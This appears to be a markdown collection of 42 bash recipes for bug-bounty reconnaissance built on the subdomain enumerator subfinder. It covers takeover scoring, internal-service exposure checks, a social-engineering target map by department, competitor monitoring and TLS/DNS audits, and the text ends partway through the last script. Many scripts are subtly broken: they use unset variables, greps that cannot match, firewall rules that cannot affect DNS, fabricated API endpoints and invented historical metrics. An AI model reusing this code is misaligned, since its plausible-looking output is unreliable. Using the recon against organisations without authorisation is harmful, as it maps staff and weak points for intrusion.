# automationbugbounty
automationbugbounty


## 1. **Target Validation & Monitoring**
```bash
# Monitor for newly acquired domains by competitors/partners
subfinder -d targetcompany.com -silent | while read sub; do
    whois $sub | grep -i "creation date" | while read date; do
        if [[ $(date -d "$date" +%s) -gt $(date -d "30 days ago" +%s) ]]; then
            echo "New domain: $sub - Created: $date"
        fi
    done
done
```

## 2. **Infrastructure Fingerprinting Through Subdomain Patterns**
```bash
# Identify cloud providers and hosting patterns
subfinder -d target.com -silent | while read host; do
    nslookup $host | grep -E "amazonaws|azure|googleusercontent|digitalocean" && 
    echo "$host is cloud-hosted"
done | sort -u
```

## 3. **Historical Technology Tracking**
```bash
# Track technology changes over time
subfinder -d company.com -silent -o subs.txt
for sub in $(cat subs.txt); do
    # Check if the subdomain was previously hosting different tech
    waybackurls $sub | head -100 | while read url; do
        curl -s -I $url | grep -i "server:" | sed "s/^/$sub historically used: /"
    done
done
```

## 4. **Attack Surface Visualization for Acquisitions**
```bash
# When companies acquire other companies, map overlapping infrastructure
acquisitions=("acquired1.com" "acquired2.com" "acquired3.com")
for domain in "${acquisitions[@]}"; do
    subfinder -d $domain -silent | while read sub; do
        # Check if any infrastructure is shared with parent company
        if host $sub | grep -q "$(dig +short parent-company.com | head -1)"; then
            echo "Shared infrastructure: $sub from $domain"
        fi
    done
done
```

## 5. **Geolocation-Based Subdomain Discovery**
```bash
# Discover region-specific deployments
subfinder -d globalcompany.com -silent | grep -E "(eu|us|asia|africa|sa|au)" | while read sub; do
    ip=$(dig +short $sub | head -1)
    if [ ! -z "$ip" ]; then
        curl -s "http://ip-api.com/json/$ip" | jq '.country, .regionName, .city'
        echo "$sub located in $country"
    fi
done
```

## 6. **Certificate Transparency Mining for Acquired IPs**
```bash
# Find new subdomains based on recently acquired IP ranges
for ip in $(cat acquired_ip_ranges.txt); do
    # Use crt.sh to find certificates issued to IP
    curl -s "https://crt.sh/?q=$ip&output=json" | jq -r '.[].name_value' | 
    while read domain; do
        subfinder -d $domain -silent
    done
done
```

## 7. **Subdomain Reputation Monitoring**
```bash
# Monitor for subdomains that might be compromised or malicious
subfinder -d target.com -silent | while read sub; do
    # Check VirusTotal for detections
    vt_result=$(curl -s "https://www.virustotal.com/api/v3/domains/$sub" \
        -H "x-apikey: $VT_API_KEY" | jq '.data.attributes.last_analysis_stats.malicious')
    if [ $vt_result -gt 0 ]; then
        echo "⚠️ Potential malicious subdomain: $sub (Detections: $vt_result)"
    fi
    
    # Check SSL certificate issues
    if ! echo | openssl s_client -connect $sub:443 2>/dev/null | openssl x509 -noout -checkend 2592000; then
        echo "⚠️ SSL certificate expiring soon: $sub"
    fi
done
```

## 8. **Subdomain Hierarchy Mapping**
```bash
# Create dependency tree of subdomains
subfinder -d company.com -silent | while read sub; do
    # Find which main subdomains are required for functionality
    if curl -s -I "https://$sub" | grep -q "200\|301\|302"; then
        # Extract all subdomain references in JavaScript
        curl -s "https://$sub" | grep -Eo '(http|https)://[^/"]+' | 
        grep -v $sub | sort -u | while read ref; do
            echo "$sub depends on $ref"
        done
    fi
done
```

## 9. **Dark Web Monitoring for Subdomains**
```bash
# Combine with dark web search engines
subfinder -d target.com -silent | while read sub; do
    # Search for mentions in Ahmia or other dark web indexes
    curl -s "https://ahmia.fi/search/?q=$sub" | grep -i "$sub" &&
    echo "⚠️ $sub mentioned on dark web: $result"
done
```

## 10. **Subdomain Takeover Probability Scoring**
```bash
# Calculate takeover probability score for each subdomain
subfinder -d target.com -silent | while read sub; do
    score=0
    # Check CNAME records pointing to unused services
    cname=$(dig +short CNAME $sub)
    if [[ $cname == *"amazonaws"* ]] && ! host $cname &>/dev/null; then
        score=$((score + 50))
        echo "AWS S3 bucket potentially available: $sub"
    fi
    if [[ $cname == *"github"* ]] && ! host $cname &>/dev/null; then
        score=$((score + 40))
        echo "GitHub Pages site potentially available: $sub"
    fi
    if [ $score -gt 70 ]; then
        echo "HIGH RISK: $sub (Score: $score)"
    fi
done
```

## 11. **Recursive Trust Discovery**
```bash
# Find third-party services that trust your target
subfinder -d target.com -silent | while read sub; do
    # Check for OAuth redirect URIs
    curl -s "https://$sub/robots.txt" 2>/dev/null | grep -i "disallow" &&
    echo "$sub has sensitive paths"
    
    # Check for exposed .well-known endpoints
    curl -s "https://$sub/.well-known/oauth-authorization-server" 2>/dev/null | 
    jq -r '.issuer, .authorization_endpoint' 2>/dev/null | while read endpoint; do
        echo "OAuth endpoint found at $sub: $endpoint"
    done
done
```

## 12. **Subdomain Lifecycle Analysis**
```bash
# Track subdomain DNS changes over time
subfinder -d company.com -silent -o today.txt
diff yesterday.txt today.txt | while read line; do
    if [[ $line == ">"* ]]; then
        new_sub=$(echo $line | cut -d' ' -f2-)
        echo "🟢 New subdomain discovered: $new_sub"
        # Immediately scan new subdomain
        nmap -p80,443,8080,8443 $new_sub
    elif [[ $line == "<"* ]]; then
        dead_sub=$(echo $line | cut -d' ' -f2-)
        echo "🔴 Subdomain no longer resolving: $dead_sub"
    fi
done
```
Here are 20 more creative and unconventional ways to use Subfinder:

## 13. **Supply Chain Attack Surface Mapping**
```bash
# Map third-party vendor dependencies
subfinder -d target.com -silent | while read sub; do
    # Extract all third-party domains from JavaScript and HTML
    curl -s "https://$sub" 2>/dev/null | grep -Eo '(https?://[^/"]+)' | 
    grep -v "$sub" | cut -d'/' -f3 | while read third_party; do
        if [[ ! -z "$third_party" ]]; then
            subfinder -d "$third_party" -silent | while read vendor_sub; do
                if host "$vendor_sub" | grep -q "$(dig +short $sub | head -1)"; then
                    echo "Shared infrastructure: $sub <-> $vendor_sub"
                fi
            done
        fi
    done
done
```

## 14. **Subdomain-Based Social Engineering Map**
```bash
# Create social engineering target map based on subdomain naming
subfinder -d company.com -silent | grep -Eo '([a-z]+)\.[a-z]+\.company\.com' | 
cut -d'.' -f1 | sort -u | while read prefix; do
    case "$prefix" in
        *hr|*people|*staff) echo "HR targets: $prefix.company.com" ;;
        *dev|*git|*code|*repo) echo "Developer targets: $prefix.company.com" ;;
        *pay|*invoice|*billing) echo "Finance targets: $prefix.company.com" ;;
        *admin|*manage|*portal) echo "Admin targets: $prefix.company.com" ;;
        *test|*staging|*dev*) echo "Potential weaker security: $prefix.company.com" ;;
    esac
done
```

## 15. **Geopolitical Risk Assessment**
```bash
# Identify subdomains hosted in high-risk jurisdictions
subfinder -d globalcorp.com -silent | while read sub; do
    ip=$(dig +short $sub | head -1)
    if [ ! -z "$ip" ]; then
        country=$(curl -s "http://ip-api.com/json/$ip" | jq -r '.countryCode')
        high_risk_countries=("CN" "RU" "IR" "KP" "SY" "VE")
        if [[ " ${high_risk_countries[@]} " =~ " ${country} " ]]; then
            echo "⚠️ HIGH RISK: $sub hosted in $country"
            # Check for sensitive data exposure
            curl -s "https://$sub/robots.txt" 2>/dev/null | grep -i "disallow" && 
            echo "  Potential sensitive paths exposed"
        fi
    fi
done
```

## 16. **Subdomain Pattern Analysis for Hidden Services**
```bash
# Find hidden development/staging environments by pattern matching
subfinder -d company.com -silent > all_subs.txt
patterns=("test" "dev" "staging" "uat" "qa" "beta" "alpha" "demo" "sandbox" "internal")
for pattern in "${patterns[@]}"; do
    # Look for subdomains that should exist but don't
    if ! grep -q "$pattern" all_subs.txt; then
        echo "Missing $pattern subdomain - checking if it exists but not in DNS..."
        for tld in com net org io co; do
            host "$pattern.company.$tld" &>/dev/null && 
            echo "Found: $pattern.company.$tld (not in standard enumeration)"
        done
    fi
done
```

## 17. **Subdomain-Based Incident Response Planning**
```bash
# Create incident response inventory with criticality scoring
subfinder -d bank.com -silent | while read sub; do
    criticality=0
    # Check for keywords indicating critical services
    if echo "$sub" | grep -E "bank|auth|login|pay|transfer|api"; then
        criticality=$((criticality + 10))
    fi
    # Check for regulatory implications
    if echo "$sub" | grep -E "compliance|audit|regulatory|report"; then
        criticality=$((criticality + 8))
    fi
    # Check for customer data
    if curl -s -I "https://$sub" 2>/dev/null | grep -i "set-cookie"; then
        criticality=$((criticality + 5))
    fi
    echo "$sub: Criticality Score $criticality"
done | sort -t: -k2 -rn > incident_response_priorities.txt
```

## 18. **Acoustic/Rhythmic Pattern Recognition**
```bash
# Find subdomains that sound like legitimate services (typosquatting detection)
subfinder -d company.com -silent | while read sub; do
    # Generate common typo variations
    echo "$sub" | sed 's/company/compnay/g; s/company/comapny/g; s/company/cmpany/g' | 
    while read typo; do
        if host "$typo" &>/dev/null; then
            echo "⚠️ Potential typosquatting: $typo"
            # Check if it's malicious
            curl -s "http://$typo" -I | grep -i "phish|bank|login|verify" && 
            echo "  MALICIOUS: $typo appears to be phishing"
        fi
    done
done
```

## 19. **Subdomain Metadata Correlation**
```bash
# Correlate subdomains with leaked credential databases
subfinder -d target.com -silent | while read sub; do
    # Check if subdomain appears in breach data (using haveibeenpwned API)
    breach_check=$(curl -s "https://haveibeenpwned.com/api/v3/breacheddomain/$sub" \
        -H "hibp-api-key: $HIBP_KEY" 2>/dev/null)
    if [ ! -z "$breach_check" ] && [ "$breach_check" != "[]" ]; then
        echo "⚠️ $sub appears in breach data: $breach_check"
    fi
    
    # Check archive.org for historical content changes
    archive_data=$(curl -s "https://archive.org/wayback/available?url=$sub")
    if echo "$archive_data" | grep -q "timestamp"; then
        first_seen=$(echo "$archive_data" | jq -r '.archived_snapshots.closest.timestamp')
        echo "$sub first appeared on web: $first_seen"
    fi
done
```

## 20. **Cross-Organization Subdomain Bridging**
```bash
# Find connections between organizations (M&A targets, partners, competitors)
companies=("companyA.com" "companyB.com" "companyC.com")
for company in "${companies[@]}"; do
    subfinder -d "$company" -silent > "${company}_subs.txt"
done

# Find shared infrastructure
for company1 in "${companies[@]}"; do
    for company2 in "${companies[@]}"; do
        if [ "$company1" != "$company2" ]; then
            while read sub1; do
                ip1=$(dig +short "$sub1" | head -1)
                while read sub2; do
                    ip2=$(dig +short "$sub2" | head -1)
                    if [ "$ip1" == "$ip2" ] && [ ! -z "$ip1" ]; then
                        echo "CONNECTION: $sub1 ($company1) and $sub2 ($company2) share IP $ip1"
                    fi
                done < "${company2}_subs.txt"
            done < "${company1}_subs.txt"
        fi
    done
done
```

## 21. **Subdomain-Based Market Intelligence**
```bash
# Track competitor expansion through subdomain analysis
competitors=("rival1.com" "rival2.com" "rival3.com")
for comp in "${competitors[@]}"; do
    subfinder -d "$comp" -silent | while read sub; do
        # Identify new market entries
        if echo "$sub" | grep -E "asia|europe|africa|launch|beta|new"; then
            echo "COMPETITOR INTELLIGENCE: $comp launching in new region: $sub"
            # Check hiring signals
            curl -s "https://$sub/careers" 2>/dev/null | grep -i "hiring|job|career" &&
            echo "  → Hiring activity detected at $sub"
        fi
    done
done
```

## 22. **Subdomain Resilience Testing**
```bash
# Test disaster recovery and failover configurations
subfinder -d company.com -silent > primary_subs.txt
# Simulate regional outage
for region in us eu asia; do
    echo "Testing $region outage scenario..."
    while read sub; do
        primary_ip=$(dig +short "$sub" | head -1)
        # Block region-specific IPs and test failover
        iptables -A INPUT -s "$primary_ip" -j DROP
        sleep 5
        failover_ip=$(dig +short "$sub" | head -1)
        if [ "$primary_ip" != "$failover_ip" ] && [ ! -z "$failover_ip" ]; then
            echo "✅ $sub has failover: $primary_ip → $failover_ip"
        fi
        iptables -D INPUT -s "$primary_ip" -j DROP
    done < primary_subs.txt
done
```

## 23. **Subdomain-Based Insider Threat Detection**
```bash
# Monitor for internal service exposure
subfinder -d company.com -silent | while read sub; do
    # Check for internal naming conventions
    if echo "$sub" | grep -E "internal|corp|private|office|staff|employee"; then
        echo "INTERNAL SERVICE EXPOSED: $sub"
        # Test authentication requirements
        response=$(curl -s -o /dev/null -w "%{http_code}" "https://$sub")
        if [ "$response" == "200" ]; then
            echo "  ⚠️ No authentication required!"
            # Check for sensitive info
            curl -s "https://$sub" | grep -i "confidential|internal use only|private" &&
            echo "  ⚠️ Sensitive internal data exposed!"
        fi
    fi
done
```

## 24. **Subdomain SEO/Reputation Analysis**
```bash
# Analyze subdomain authority and search engine ranking
subfinder -d company.com -silent | while read sub; do
    # Check Google PageRank (simplified)
    moz_rank=$(curl -s "https://moz.com/api/v2/metrics/url?url=$sub" \
        -H "Mozscape-Access-ID: $MOZ_ID" 2>/dev/null | jq '.page_authority')
    
    # Check backlinks
    backlinks=$(curl -s "https://api.majestic.com/api/json?app_api_key=$MAJESTIC_KEY&cmd=GetBackLinkData&item=$sub" | 
        jq '.DataTables.BackLinks.Count')
    
    echo "$sub: Page Authority: $moz_rank, Backlinks: $backlinks"
    
    # Alert on reputation drops
    if [ $moz_rank -lt 20 ] && [ $backlinks -lt 10 ]; then
        echo "⚠️ Low reputation subdomain that could be abused: $sub"
    fi
done
```

## 25. **Subdomain-Based Threat Hunting Queries**
```bash
# Create threat hunting queries for SIEM/SOAR platforms
subfinder -d company.com -silent | while read sub; do
    ip=$(dig +short "$sub" | head -1)
    
    # Splunk query
    echo "index=proxy sourcetype=access_combined url=*$sub* | stats count by src_ip" > "splunk_${sub}.spl"
    
    # Elasticsearch query
    echo "{\"query\":{\"wildcard\":{\"domain\":\"*$sub\"}}}" > "elastic_${sub}.json"
    
    # Sigma rule
    cat << EOF > "sigma_${sub}.yml"
title: Suspicious connection to $sub
logsource:
  category: network_connection
detection:
  selection:
    destination_hostname: '*$sub'
    destination_ip: '$ip'
  condition: selection
EOF
    
    echo "Generated hunting queries for $sub ($ip)"
done
```

## 26. **Subdomain Lifecycle Cost Analysis**
```bash
# Estimate infrastructure costs based on subdomain patterns
subfinder -d startup.com -silent | while read sub; do
    cname=$(dig +short CNAME "$sub")
    cost=0
    
    # AWS services
    if [[ $cname == *"amazonaws.com"* ]]; then
        if [[ $cname == *"s3"* ]]; then
            cost=$((cost + 25)) # S3 bucket monthly cost
        elif [[ $cname == *"cloudfront"* ]]; then
            cost=$((cost + 50)) # CloudFront distribution
        fi
    fi
    
    # Heroku
    if [[ $cname == *"herokuapp.com"* ]]; then
        cost=$((cost + 25)) # Heroku dyno
    fi
    
    # Shopify
    if [[ $cname == *"myshopify.com"* ]]; then
        cost=$((cost + 29)) # Shopify basic plan
    fi
    
    echo "$sub: Estimated monthly cost \$$cost"
done | awk '{sum+=$NF} END {print "Total estimated infrastructure cost: $" sum}'
```

## 27. **Subdomain Acquisition Opportunity Finder**
```bash
# Find expiring/available subdomains for brand protection
subfinder -d company.com -silent | while read sub; do
    # Check expiration dates for domain registrations
    expiry_date=$(whois "$sub" | grep -i "expir" | head -1 | grep -Eo '[0-9]{4}-[0-9]{2}-[0-9]{2}')
    if [ ! -z "$expiry_date" ]; then
        days_until_expiry=$(( ($(date -d "$expiry_date" +%s) - $(date +%s)) / 86400 ))
        
        if [ $days_until_expiry -lt 30 ] && [ $days_until_expiry -gt 0 ]; then
            echo "⚠️ $sub expiring in $days_until_expiry days - RENEW IMMEDIATELY"
        elif [ $days_until_expiry -lt 0 ]; then
            # Check if domain is available
            if whois "$sub" 2>&1 | grep -q "No match\|NOT FOUND"; then
                echo "🟢 $sub is AVAILABLE for registration!"
            fi
        fi
    fi
done
```

## 28. **Subdomain DNS Health Check**
```bash
# Comprehensive DNS health monitoring
subfinder -d company.com -silent > all_subs.txt

echo "DNS Health Report - $(date)" > dns_health.txt
echo "=====================" >> dns_health.txt

while read sub; do
    # Check DNSSEC
    dnssec_status=$(dig +dnssec "$sub" | grep -i "ad;" | wc -l)
    if [ $dnssec_status -eq 0 ]; then
        echo "❌ $sub: DNSSEC not enabled" >> dns_health.txt
    fi
    
    # Check SPF records
    spf=$(dig TXT "$sub" | grep -i "v=spf1")
    if [ -z "$spf" ]; then
        echo "⚠️ $sub: No SPF record found" >> dns_health.txt
    fi
    
    # Check DMARC
    dmarc=$(dig TXT "_dmarc.$sub" | grep -i "v=DMARC")
    if [ -z "$dmarc" ]; then
        echo "⚠️ $sub: No DMARC record found" >> dns_health.txt
    fi
    
    # Check DNS response time
    response_time=$(dig "$sub" | grep "Query time:" | awk '{print $4}')
    if [ $response_time -gt 100 ]; then
        echo "⚠️ $sub: Slow DNS response (${response_time}ms)" >> dns_health.txt
    fi
    
done < all_subs.txt
```

## 29. **Subdomain Watering Hole Detection**
```bash
# Identify subdomains that could be used for watering hole attacks
subfinder -d company.com -silent | while read sub; do
    # Check for outdated software
    server_header=$(curl -s -I "https://$sub" 2>/dev/null | grep -i "^server:" | cut -d' ' -f2-)
    
    # Version detection and vulnerability checking
    if echo "$server_header" | grep -q "Apache/2.2"; then
        echo "⚠️ OUTDATED: $sub running $server_header (known vulnerabilities)"
    elif echo "$server_header" | grep -q "PHP/5"; then
        echo "⚠️ OUTDATED: $sub running $server_header (end of life)"
    fi
    
    # Check for vulnerable JS libraries
    curl -s "https://$sub" 2>/dev/null | grep -o 'src="[^"]*\.js"' | cut -d'"' -f2 | while read js; do
        full_url="https://$sub$js"
        curl -s "$full_url" | grep -E "jquery-1\.[0-9]|angular-1\.[0-9]|bootstrap-3\.[0-9]" && 
        echo "⚠️ VULNERABLE JS: $full_url uses outdated library"
    done
done
```

## 30. **Subdomain-Based Threat Intelligence Feeds**
```bash
# Create custom threat intelligence feeds
subfinder -d target.com -silent | while read sub; do
    ip=$(dig +short "$sub" | head -1)
    
    # Generate STIX format indicators
    cat << EOF >> "threat_intel_$(date +%Y%m%d).stix"
{
  "type": "indicator",
  "spec_version": "2.1",
  "name": "Observed subdomain $sub",
  "pattern": "[domain-name:value = '$sub'] OR [ipv4-addr:value = '$ip']",
  "valid_from": "$(date -Iseconds)",
  "labels": ["subdomain", "observed", "$(echo $sub | cut -d. -f1)"]
}
EOF

    # Add to MISP events
    curl -X POST -H "Authorization: $MISP_KEY" -H "Content-Type: application/json" \
        -d "{\"Attribute\":{\"value\":\"$sub\",\"type\":\"domain\",\"category\":\"Network activity\"}}" \
        "https://misp.local/attributes/add"
    
    echo "Added $sub to threat intelligence feeds"
done
```

## 31. **Subdomain Encryption Standards Audit**
```bash
# Audit TLS/SSL configurations across all subdomains
subfinder -d bank.com -silent | while read sub; do
    echo "Auditing $sub..."
    
    # Get TLS version and cipher info
    tls_info=$(echo | openssl s_client -connect "$sub:443" -tls1_3 2>/dev/null)
    
    # Check TLS version
    if echo "$tls_info" | grep -q "TLSv1.3"; then
        tls_score=10
    elif echo "$tls_info" | grep -q "TLSv1.2"; then
        tls_score=8
    elif echo "$tls_info" | grep -q "TLSv1.1"; then
        tls_score=4
        echo "⚠️ $sub using outdated TLSv1.1"
    else
        tls_score=0
        echo "❌ $sub using insecure TLS/SSL"
    fi
    
    # Check certificate strength
    cert_info=$(echo | openssl s_client -connect "$sub:443" 2>/dev/null | openssl x509 -text)
    key_length=$(echo "$cert_info" | grep "Public-Key:" | grep -Eo '[0-9]+')
    if [ $key_length -lt 2048 ]; then
        echo "⚠️ $sub using weak key length ($key_length bits)"
        tls_score=$((tls_score - 3))
    fi
    
    # Check HSTS
    hsts=$(curl -s -I "https://$sub" | grep -i "strict-transport-security")
    if [ -z "$hsts" ]; then
        echo "⚠️ $sub missing HSTS header"
        tls_score=$((tls_score - 2))
    fi
    
    echo "$sub: TLS Score $tls_score/10" >> tls_audit_results.txt
done
```

## 32. **Subdomain Dependency Mapping for Disaster Recovery**
```bash
# Create complete dependency graph for DR planning
subfinder -d company.com -silent > live_subs.txt

echo "digraph Dependencies {" > deps.dot
while read sub; do
    # Find all external resources this subdomain depends on
    curl -s "https://$sub" 2>/dev/null | grep -Eo '(https?://[^/"]+)' | 
    grep -v "$sub" | cut -d'/' -f3 | while read dep; do
        echo "  \"$sub\" -> \"$dep\";" >> deps.dot
    done
    
    # Find IP dependencies
    ip=$(dig +short "$sub" | head -1)
    if [ ! -z "$ip" ]; then
        echo "  \"$sub\" -> \"$ip\";" >> deps.dot
    fi
done < live_subs.txt
echo "}" >> deps.dot

# Generate visual graph
dot -Tpng deps.dot -o dependency_graph.png
echo "Dependency graph generated: dependency_graph.png"
```
Here are 10 more creative and unconventional ways to use Subfinder:

## 33. **Subdomain-Based M&A Target Identification**
```bash
# Identify potential acquisition targets through infrastructure overlap
subfinder -d acquirer.com -silent > acquirer_subs.txt

# Find companies with similar technology stack or infrastructure patterns
for sector in fintech healthtech saas ecommerce; do
    crtsh -q "%.$sector.com" 2>/dev/null | while read potential_target; do
        # Check if they use similar cloud providers
        if dig +short "$potential_target" | grep -q "$(dig +short acquirer.com | head -1)"; then
            echo "🔍 INFRASTRUCTURE OVERLAP: $potential_target shares IP space with acquirer"
        fi
        
        # Compare subdomain patterns
        subfinder -d "$potential_target" -silent > target_subs.txt
        common_patterns=$(comm -12 <(sort acquirer_subs.txt) <(sort target_subs.txt) | wc -l)
        
        if [ $common_patterns -gt 10 ]; then
            echo "💼 ACQUISITION TARGET: $potential_target shares $common_patterns subdomain patterns"
        fi
    done
done
```

## 34. **Subdomain-Based Insider Trading Detection**
```bash
# Monitor competitor subdomain launches before public announcements
competitors=("competitor1.com" "competitor2.com" "competitor3.com")

for comp in "${competitors[@]}"; do
    # Take baseline
    subfinder -d "$comp" -silent > "baseline_${comp}.txt"
    
    # Monitor daily for new subdomains
    while true; do
        subfinder -d "$comp" -silent > "current_${comp}.txt"
        
        # Detect new subdomains
        comm -13 "baseline_${comp}.txt" "current_${comp}.txt" | while read new_sub; do
            # Check for product launch indicators
            if echo "$new_sub" | grep -E "product|launch|beta|new|app"; then
                echo "📈 COMPETITOR INTELLIGENCE: $comp launching new service at $new_sub"
                
                # Check LinkedIn for hiring related to this product
                curl -s "https://linkedin.com/company/$comp" | grep -i "product manager|engineer" &&
                echo "  → Hiring for this product detected"
            fi
        done
        
        mv "current_${comp}.txt" "baseline_${comp}.txt"
        sleep 86400  # Check daily
    done
done
```

## 35. **Subdomain-Based Digital Twin Creation**
```bash
# Create digital twin of target infrastructure for testing
subfinder -d production.com -silent | while read sub; do
    # Map complete infrastructure
    ip=$(dig +short "$sub" | head -1)
    server=$(curl -s -I "https://$sub" 2>/dev/null | grep -i "^server:" | cut -d' ' -f2-)
    
    # Create Terraform configuration for digital twin
    cat << EOF >> "digital_twin_${sub}.tf"
resource "aws_instance" "${sub//./_}" {
  ami = data.aws_ami.${server// /_}.id
  instance_type = "t2.micro"
  tags = {
    Name = "digital-twin-${sub}"
    Original = "$sub"
    IP = "$ip"
  }
  
  user_data = <<-EOF
    #!/bin/bash
    echo "Digital twin of $sub" > /etc/motd
    # Replicate production configuration
    curl -s https://$sub -o /tmp/production_config
  EOF
}
EOF

    # Create monitoring rules for digital twin
    cat << EOF >> "prometheus_rules_${sub}.yml"
groups:
  - name: digital_twin_${sub}
    rules:
      - record: twin:response_time
        expr: probe_duration_seconds{target="$sub"}
      - alert: TwinDeviation
        expr: abs(twin:response_time - probe_duration_seconds{target="digital-twin-$sub"}) > 0.5
        for: 5m
        annotations:
          summary: "Digital twin deviating from production"
EOF
done
```

## 36. **Subdomain-Based Patent Infringement Detection**
```bash
# Monitor for potential patent infringement through subdomain patterns
patented_technologies=("algorithmX" "processY" "methodZ")

for tech in "${patented_technologies[@]}"; do
    # Search for companies using similar naming patterns
    crtsh -q "%$tech%.com" 2>/dev/null | while read domain; do
        subfinder -d "$domain" -silent | while read sub; do
            # Check if they're using the technology
            curl -s "https://$sub" 2>/dev/null | grep -i "$tech" && 
            echo "⚠️ POTENTIAL PATENT INFRINGEMENT: $sub using $tech"
            
            # Check job postings for the technology
            curl -s "https://$domain/careers" 2>/dev/null | grep -i "$tech" &&
            echo "  → Hiring for $tech at $domain"
        done
    done
done
```

## 37. **Subdomain-Based Climate Impact Assessment**
```bash
# Assess environmental impact of infrastructure
subfinder -d company.com -silent | while read sub; do
    ip=$(dig +short "$sub" | head -1)
    
    # Get datacenter location
    location=$(curl -s "http://ip-api.com/json/$ip" | jq -r '.city, .regionName, .country')
    
    # Check if datacenter uses renewable energy
    green_dcs=("Oregon" "Netherlands" "Sweden" "Finland" "California")
    for green_dc in "${green_dcs[@]}"; do
        if echo "$location" | grep -q "$green_dc"; then
            echo "✅ $sub hosted in green datacenter: $location"
        else
            # Calculate carbon footprint estimate
            power_usage=$(curl -s "https://api.eia.gov/datacenter/?ip=$ip" | jq '.power_usage')
            carbon_intensity=$(curl -s "https://api.electricitymap.org/v3/carbon-intensity/latest?zone=$(curl -s ip-api.com/json/$ip | jq -r '.countryCode')")
            
            footprint=$(echo "$power_usage * $carbon_intensity" | bc)
            echo "🌍 $sub carbon footprint: ${footprint}kg CO2/month"
        fi
    done
done
```

## 38. **Subdomain-Based Crisis Communication Planning**
```bash
# Identify critical communication channels for crisis scenarios
subfinder -d critical-infra.com -silent | while read sub; do
    # Classify by criticality
    if echo "$sub" | grep -E "emergency|alert|notify|status|health"; then
        criticality="CRITICAL"
    elif echo "$sub" | grep -E "backup|recovery|failover|dr"; then
        criticality="HIGH"
    elif echo "$sub" | grep -E "monitor|metrics|logging"; then
        criticality="MEDIUM"
    else
        criticality="LOW"
    fi
    
    # Test availability from different regions
    for region in us eu asia sa africa; do
        region_ip=$(dig +short "$sub" @"${region}.dns.server")
        if [ ! -z "$region_ip" ]; then
            echo "$sub: Available in $region"
        else
            echo "⚠️ $sub NOT AVAILABLE in $region - crisis comms risk"
        fi
    done
    
    # Document in crisis plan
    cat << EOF >> "crisis_communication_plan.md"
## $sub ($criticality)
- Primary Purpose: $(echo "$sub" | cut -d'.' -f1)
- Contact: admin@$sub
- Fallback: backup-$sub
- Region Availability: $regions
- Crisis Protocol: 
  1. Monitor response time
  2. Activate failover if latency > 500ms
  3. Escalate to $(echo "$criticality" | tr '[:upper:]' '[:lower:]') response team
EOF
done
```

## 39. **Subdomain-Based Sentiment Analysis**
```bash
# Analyze public sentiment towards different services
subfinder -d company.com -silent | while read sub; do
    # Search for mentions on social media
    twitter_mentions=$(curl -s "https://api.twitter.com/2/tweets/search/recent?query=$sub" \
        -H "Authorization: Bearer $TWITTER_BEARER_TOKEN" | jq '.meta.result_count')
    
    # Check sentiment from reviews
    trustpilot_score=$(curl -s "https://api.trustpilot.com/v1/business-units/find?name=$sub" \
        -H "apikey: $TRUSTPILOT_KEY" | jq '.score')
    
    # Analyze Reddit discussions
    reddit_sentiment=$(curl -s "https://www.reddit.com/search.json?q=$sub&limit=100" | 
        jq '[.data.children[].data.score] | add / length')
    
    echo "$sub: Twitter: $twitter_mentions mentions, Trustpilot: $trustpilot_score, Reddit: $reddit_sentiment avg score"
    
    # Alert on negative sentiment
    if [ $reddit_sentiment -lt 0 ]; then
        echo "⚠️ Negative sentiment detected for $sub - investigate customer issues"
    fi
done
```

## 40. **Subdomain-Based Zero Trust Implementation**
```bash
# Map out Zero Trust policy requirements
subfinder -d company.com -silent | while read sub; do
    ip=$(dig +short "$sub" | head -1)
    
    # Determine resource sensitivity
    sensitivity="LOW"
    if echo "$sub" | grep -E "admin|internal|corp|private|secure"; then
        sensitivity="HIGH"
    elif echo "$sub" | grep -E "api|data|db|backend"; then
        sensitivity="MEDIUM"
    fi
    
    # Generate Zero Trust policies
    cat << EOF >> "zero_trust_policies.json"
{
  "resource": "$sub",
  "ip": "$ip",
  "sensitivity": "$sensitivity",
  "policies": {
    "authentication": "$([ $sensitivity == "HIGH" ] && echo "MFA required" || echo "Basic auth allowed")",
    "access": [
      $(if [ $sensitivity == "HIGH" ]; then
        echo '"allow: vpn_users", "allow: trusted_ips"'
      else
        echo '"allow: authenticated_users"'
      fi)
    ],
    "monitoring": {
      "log_level": "$([ $sensitivity == "HIGH" ] && echo "verbose" || echo "standard")",
      "alert_on": "$([ $sensitivity == "HIGH" ] && echo "all_access" || echo "failed_attempts")"
    }
  }
}
EOF

    # Create network segmentation rules
    if [ $sensitivity == "HIGH" ]; then
        echo "iptables -A FORWARD -d $ip -m comment --comment \"$sub\" -j LOG" >> firewall_rules.sh
    fi
done
```

## 41. **Subdomain-Based Blockchain/Smart Contract Discovery**
```bash
# Discover blockchain-related infrastructure
subfinder -d crypto-company.com -silent | while read sub; do
    # Check for blockchain explorers
    if curl -s "https://$sub/api/v1/network" 2>/dev/null | grep -q "blockchain"; then
        echo "🔗 Blockchain node detected: $sub"
        
        # Try to extract network info
        chain_id=$(curl -s "https://$sub/api/v1/chain-id" 2>/dev/null)
        echo "  Chain ID: $chain_id"
        
        # Check for smart contracts
        curl -s "https://$sub/contracts" 2>/dev/null | grep -Eo '0x[a-fA-F0-9]{40}' | while read contract; do
            echo "  Smart contract found: $contract"
            
            # Check if contract is verified
            verified=$(curl -s "https://api.etherscan.io/api?module=contract&action=getabi&address=$contract" | jq '.status')
            if [ "$verified" == "1" ]; then
                echo "    ✅ Verified contract"
            fi
        done
    fi
    
    # Check for Web3 endpoints
    if curl -s -X POST -H "Content-Type: application/json" \
        -d '{"jsonrpc":"2.0","method":"web3_clientVersion","params":[],"id":1}' \
        "https://$sub" 2>/dev/null | grep -q "result"; then
        echo "🪙 Web3 RPC endpoint: $sub"
    fi
done
```

## 42. **Subdomain-Based Predictive Maintenance**
```bash
# Predict infrastructure failures based on subdomain patterns
subfinder -d critical.com -silent | while read sub; do
    # Collect performance metrics over time
    for i in {1..30}; do
        response_time=$(curl -o /dev/null -s -w "%{time_total}\n" "https://$sub")
        echo "$(date -d "-$i days" +%Y-%m-%d),$response_time" >> "metrics_${sub}.csv"
    done
    
    # Analyze trends
    avg_response=$(awk -F',' '{sum+=$2} END {print sum/NR}' "metrics_${sub}.csv")
    recent_avg=$(tail -7 "metrics_${sub}.csv" | awk -F',' '{sum+=$2} END {print sum/NR}')
    
    # Predict failures using simple trend analysis
    if (( $(echo "$recent_avg > $avg_response * 1.5" | bc -l) )); then
        echo "⚠️ PREDICTIVE ALERT: $sub showing degradation - possible failure in 7-10 days"
        
        # Recommend maintenance window
        echo "  Recommended: Schedule maintenance for $(date -d "+7 days" +%Y-%m-%d)"
        
        # Check backup systems
